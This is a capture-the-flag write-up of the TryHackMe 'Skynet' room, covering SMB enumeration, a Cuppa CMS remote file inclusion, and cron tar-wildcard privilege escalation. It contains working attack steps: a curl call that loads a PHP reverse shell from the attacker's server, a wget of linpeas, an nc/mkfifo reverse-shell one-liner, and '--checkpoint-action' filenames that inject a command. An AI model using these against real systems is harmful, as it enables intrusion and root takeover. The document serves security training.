<a href="https://tryhackme.com/room/skynet"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>
# Skynet

## nmap
```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```
## gobuster
```
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301) /notes (Status: 301) # 
/squirrelmail (Status: 301) #SquirrelMail version 1.4.23 [SVN]  - goes to /src/login.php
/server-status (Status: 403)
```
## nikto
Nothing in particular was highlighted for me using this tool.

## samba
We used SMBMap to enumerate samba share drives for this site as indicated by the nmap scan.
```
smbmap -H 10.10.167.97
```
This gives us something to look at, and think about. We have a possible user name - milesdyson as an anonymous share:
```
smbmap -H 10.10.7.233                                                                                                                                                                         
[+] Guest session       IP: 10.10.7.233:445     Name: 10.10.7.233                                                                                                                                                                   
        Disk                                                    Permissions     Comment                                                                                                                                             
        ----                                                    -----------     -------                                                                                                                                             
        print$                                                  NO ACCESS       Printer Drivers                                                                                                                                     
        anonymous                                               READ ONLY       Skynet Anonymous Share                                                                                                                              
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share                                                                                                                          
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))  
```
Lets look at the anonymous share as we do not have any passwords yet.
```
smbclient //10.10.7.233/anonymous

smb: \> ls
  .                                   D        0  Wed Sep 18 05:41:20 2019
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019
  books                               D        0  Wed Sep 18 05:40:06 2019
```
Lets get that file and see what it says.
```
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
```
If we review this file we can see that there has been a system malfunction:
```
cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
We now confirm the name of Miles Dyson from the previously run SMB scan.

Lets check out the rest of the smb anonymous share. If we go to the log directory, we find only one file with data - log1.txt. Lets see what that says:
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
Possibly a list of passwords? Its a bit cheeky but we know the length of the password from the number of * in the task question so lets try that on squirrelmail with our user Miles.

## squirrelmail

Login with Miles's password and we see three emails.
```
Samba Password Reset
We have changed your smb password after system malfunction.
Password: <insertpasswordhere>
```

```
No Subject
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```

If we translate this it comes out as: *balls have zero to me to me to me to me to me to me to me to me to*, which if you do a search is an interesting read!!

```
No Subject

i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```
Lets just check back in Samba again with Miles's credentials and see what else he has there. There are a number of pdf and document files, with a notes folder. When we check this out we find a number of .md documents (markdown) and an important.txt. If we read this we get a todo list:
```
1. Add features to beta CMS /<inserthiddenfolderhere>
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
Hopefully he has his priorities right, but now we have a CMS and possible hidden directory we are looking for as part of Task 2. If we investigate, this takes us to Miles's personal page. Let's go back to gobuster again and use it on the new directory.

This search provides a further set of directories, obviously as part of the Cuppa CMS that Miles mentioned earlier.

```
gobuster dir -u http://10.10.22.10/<inserthiddendirectory>/administrator -w /usr/sh│
are/wordlists/dirbuster/directory-list-2.3-medium.txt                                                             │
===============================================================                                                   │
Gobuster v3.0.1                                                                                                   │
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                   │
===============================================================                                                   │
[+] Url:            http://10.10.22.10/<inserthiddendirectory>/administrator                                             │
[+] Threads:        10                                                                                            │
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                  │
[+] Status codes:   200,204,301,302,307,401,403                                                                   │
[+] User Agent:     gobuster/3.0.1                                                                                │
[+] Timeout:        10s                                                                                           │
===============================================================                                                   │
2020/07/26 06:46:02 Starting gobuster                                                                             │
===============================================================                                                   │
/media (Status: 301)                                                                                              │
/templates (Status: 301)                                                                                          │
/alerts (Status: 301)                                                                                             │
/js (Status: 301)                                                                                                 │
/components (Status: 301)                                                                                         │
/classes (Status: 301)                                                                                            │
===============================================================                                                   │
2020/07/26 06:53:51 Finished                                                                                      │
=============================================================== 
```
## exploitDB
Lets see what we can find out about Cuppa CMS. 

There is only one exploit that is visible. It is Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion.

A number of options are available so lets go through them. Looks like we can extract the CMS configuration file at least to Base64. If we try that we get:
```
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo
```

Which gives us this after extraction:
```
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
```
Maybe a bit of luck? I tried the username and password to no avail. So the next stage looks like Local File Inclusion, with the example showing the /passwd file. If this works we can then possibly get the user flag by trying /home/milesdyson/user.txt. That was a no, so lastly the third area of the expolitDB where we can run a reverse shell. I will be using the php-reverse-shell.php from pentestmonkey.

All we have to do is amend the script so that out host machine is set to receive the remote shell.

So, in order of march, just below the shell comments, amend the details:
```
set_time_limit (0);                                                                                               │
$VERSION = "1.0";                                                                                                 │
$ip = '10.9.12.213';  // CHANGE THIS                                                                              │
$port = 1234;       // CHANGE THIS    
```
Next set up your terminal so the actual file can be uploaded to the target. For this a simple http server will suffice.
```
python3 -m http.server 
```
Then run a netcat session to accept the remote shell, on the port you selected in the code above:

```
nc -lnvp 1234
```

Finally run the curl command:
```
curl http://10.10.22.10/<inserthiddendirectory>/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.12.213:8000/php-reverse-shell.php
```
We are in and now have access ot the www-data shell, we should be able to find the user flag, which we do in Miles's folder. It is also prudent to have a look around his file system. He won't mind.

Lets see what LINPEAS (privilege-escalation-awesome-script) can do for us on the host. As the user www-data, cd to a writable folder. In this case I will be using **/tmp**

Upload linpeas.sh
```
wget http://10.9.12.213:8000/linpeas.sh
```
Make it executable:
```
chmod +x linpeas.sh
```
Run it to see what it provides:
```
./limpeas.sh
```
We see some backup files for Miles that we had seen during the initial search for the user flag:
```
[+] Backup files?                                                                                                                                                 
-rw-r--r-- 1 root root 128 Sep 17  2019 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 673 Sep 17  2019 /etc/xml/xml-core.xml.old                                                                                                 -rw-r--r-- 1 root root 610 Sep 17  2019 /etc/xml/catalog.old                                                                                                      -rwxr-xr-x 1 root root 74 Sep 17  2019 /home/milesdyson/backups/backup.sh                                                                                         -rw-r--r-- 1 root root 4679680 Jul 26 01:38 /home/milesdyson/backups/backup.tgz
```
If we look at the backup.sh, we see that it is creating a backup of the /var/www/html folder and saving to the backup.tgz in Miles home directory. If we look at the last back up time it was extremely recent. Nothing else was highlighted in linpeas so lets look closer at crontab:
```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
``` 
So it looks like this is backing up every minute! Now I will admit that I had to use the write up for this and as highlighted by Ben Spring the [HelpNetSecutity](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) tar write up is excellent. 

I did wonder about placing the * and where it would sit, but when you look at the script it is actually already there. So to get this too work, I simply set up a new netcat session on a different port (already running one for user www-data) and:
```
cd /var/www/html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.213 4444 >/tmp/f" > shell.sh
```
I then listed the files to check it was there and finally added the checkpoints, that when run would create the root shell back to my host when cron ran:
```
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
From here, just a matter of moments until a root shell opened and I was able to get the root flag.

A really enjoyable room, that took me a while. I did also find a possible exploit when we logged into the CMS as there was a password reset link that was hidden. I neet to do some more work on my web side, but I felt that as I had access to Miles's emails (and verified I could send and receive) that this maybe a valid vulnerabilty. I will definately come back to try that piece of the puzzle again.

Regards

K

![](/images/Karti.png)

